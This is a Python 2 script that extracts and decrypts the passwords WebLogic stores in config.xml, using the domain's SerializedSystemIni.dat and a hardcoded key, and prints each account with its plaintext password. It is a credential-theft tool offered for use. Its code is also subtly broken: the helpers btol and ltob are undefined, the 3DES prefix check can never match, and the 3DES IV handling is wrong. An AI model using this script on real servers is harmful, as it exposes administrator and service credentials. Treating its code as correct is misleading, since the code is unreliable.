#!/usr/bin/env python
# /console/ login account
# -i ~/wls<VERSION>/user_projects/domains/<DOMAIN_NAME>/security/SerializedSystemIni.dat
# -f ~/wls<VERSION>/user_projects/domains/<DOMAIN_NAME>/config/config.xml
from Crypto.Cipher import ARC2, AES, DES3
from Crypto.Hash import SHA

import struct
import re
import os
from base64 import b64decode

from optparse import OptionParser

# Script version
VERSION = '1.0'

parser = OptionParser(usage="%prog [options]\nVersion: " + VERSION)
parser.add_option("-i", "--ini", dest="ini_file",  help="Path to SerializedSystemIni.dat file", default='./SerializedSystemIni.dat')
parser.add_option("-s", "--string", dest="cipher_string",  help="Cipher string from config.xml")
parser.add_option("-f", "--config-file", dest="config_file", help="Weblogic configuration file", default='./config.xml')

# shortcut functions
BS = 8
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]
ceildiv = lambda n, d: (n + d - 1) // d

# key used by all Weblogic servers
WEBLOGIC_MASTER_KEY = "0xccb97558940b82637c8bec3c770f86fa3a391a56"

RE_AES =  re.compile(r'([^>]+?)<\/[^>]+?>\s+?<[^>]+?>\{AES\}(.+?)<\/')
RE_3DES = re.compile(r'([^>]+?)<\/[^>]+?>\s+?<[^>]+?>\{3DES\}(.+?)<\/')

def unpack_helper(fmt, data):
    size = struct.calcsize(fmt)
    return struct.unpack(fmt, data[:size]), data[size:]

def PBKDF3(P, S, count, dklen, ivlen, hash):
    def makelen(bytes, tolen):
        q, r = divmod(tolen, len(bytes)) if bytes else (0, 0)
        return bytes * q + bytes[:r]

    u = hash.digest_size
    v = hash.block_size
    S = makelen(S, v * ceildiv(len(S), v))
    P = makelen(P, v * ceildiv(len(P), v))
    II = S + P

    def kdf(xlen, id, I):
        k = ceildiv(xlen, u)
        D = chr(id)*v
        A = []

        for i in xrange(1, k+1):
            Ai = reduce(lambda Ai,_: hash.new(Ai).digest(), xrange(count), D + I)
            A.append(Ai)

            if i == k:
                break

            B = btol(makelen(Ai, v)) + 1
            I = ''.join([ltob(btol(I[j:j+v]) + B, v) for j in range(0, len(I), v)])
        return b''.join(A)[:xlen], I

    key, I = kdf(dklen, 1, II)
    init, I = kdf(ivlen, 2, I) if ivlen > 1 else None

    return key, init

def read_ini_file(path):
    with open(path) as fd:
        b = fd.read()

    (salt_len, ), b = unpack_helper("=B", b)
    (salt, version, key_len), b = unpack_helper("=%ssBB" % salt_len, b)
    (key, ), b = unpack_helper("=%ss" % key_len, b)
    if version >= 2:
        (key_len, ), b = unpack_helper("=B", b)
        (key, ), b = unpack_helper("=%ss" % key_len, b)

    return (salt, key)

def decrypt_pbe_with_and_128rc2_CBC(cipher_text, password, salt, count):
    kdf = PBKDF3(password, salt, count, 16, 8, SHA)
    cipher = ARC2.new(kdf[0], ARC2.MODE_CBC, kdf[1], effective_keylen=128)
    secret_key = unpad(cipher.decrypt(cipher_text))

    return secret_key


def decrypt_AES(key, data, salt):
    # AES/CBC/PKCS5Paddin with iv = salt[:16]
    cipher = AES.new(key, AES.MODE_CBC, data[:AES.block_size])
    plain_password = unpad(cipher.decrypt(data[AES.block_size:]))

    return plain_password

def decrypt_3DES(key, data, salt):
    # DESEDE/CBC/PKCS5Padding with iv is the salt
    cipher = DES3.new(key, DES3.MODE_CBC, salt[DES3.block_size])
    plain_password = cipher.decrypt(data)

    return plain_password

def main():
    (options, args) = parser.parse_args()

    if not options.ini_file:
        parser.error('Missing SerializedSystemIni.dat file')

    datas = []
    if options.cipher_string:
        if options.cipher_string[:5] == '{AES}':
            datas = [(decrypt_AES, None, options.cipher_string[5:])]
        elif options.cipher_string[:5] == '{3DES}':
            datas = [(decrypt_3DES, None, options.cipher_string[5:])]
        else:
            parser.error('Cipher string must start with "{AES}" or "{3DES}"')
    elif options.config_file:
        if not os.path.isfile(options.config_file):
            parser.error('Config file does not exist')

        with open(options.config_file) as fd:
            f = fd.read()

        datas = map(lambda i: (decrypt_AES, i[0], i[1]), RE_AES.findall(f)) + map(lambda i: (decrypt_3DES, i[0], i[1]), RE_3DES.findall(f))

        if len(datas) == 0:
            parser.error('No password found in the config file')
    else:
        parser.error('Missing cipher string or configuration file')


    # encode this key the "Java" encoding utf-16-be
    password = (unicode(WEBLOGIC_MASTER_KEY) + u'\0').encode('utf-16-be')

    # read the ini file to get the salt and encryption key
    salt, encryption_key = read_ini_file(options.ini_file)

    # generate the secret-key using:
    #  - PBEWITHSHAAND128BITRC2-CBC
    #  - 5 rounds
    secret_key = decrypt_pbe_with_and_128rc2_CBC(encryption_key, password, salt, 5)

    for decrypt_fn, username, ciphertext in datas:
        data = b64decode(ciphertext)
        # decrypt the passwors using the correct cipher
        plain_password = decrypt_fn(secret_key, data, salt)

        if username:
            print "[+] Account: {}\t{}".format(username, plain_password)
        else:
            print "[+] Password:", plain_password

if __name__ == "__main__":
    main()
